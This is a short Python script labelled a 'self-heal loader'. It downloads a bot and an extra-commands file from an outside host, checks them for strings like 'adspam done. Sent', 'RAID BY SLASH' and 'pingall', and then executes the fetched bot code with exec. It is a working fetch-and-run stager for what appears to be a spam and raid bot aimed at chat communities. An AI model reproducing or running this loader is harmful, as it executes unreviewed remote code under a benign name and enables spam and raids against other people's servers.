#!/usr/bin/env python3
"""Self-heal loader."""
import os
import sys
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
BOT_URL = "https://mutual-lupin-13sye.ship.place/bot.py"
EXTRA_URL = "https://mutual-lupin-13sye.ship.place/extra_cmds.py"
BOT_FILE = os.path.join(HERE, "bot_full.py")
EXTRA_FILE = os.path.join(HERE, "extra_cmds.py")

def fetch(url, dest, needles):
    print(f"Fetching {url}")
    with urllib.request.urlopen(url, timeout=30) as r:
        data = r.read()
    for n in needles:
        if n.encode() not in data:
            print(f"bad download, missing {n!r}")
            sys.exit(1)
    with open(dest, "wb") as f:
        f.write(data)
    print(f"  wrote {dest} ({len(data)} bytes)")

if __name__ == "__main__":
    fetch(BOT_URL, BOT_FILE, ["adspam done. Sent", "RAID BY SLASH", "clear_commands"])
    fetch(EXTRA_URL, EXTRA_FILE, ["pingall", "doall"])
    with open(BOT_FILE, encoding="utf-8") as f:
        code = f.read()
    exec(compile(code, BOT_FILE, "exec"), {"__name__": "__main__", "__file__": BOT_FILE})
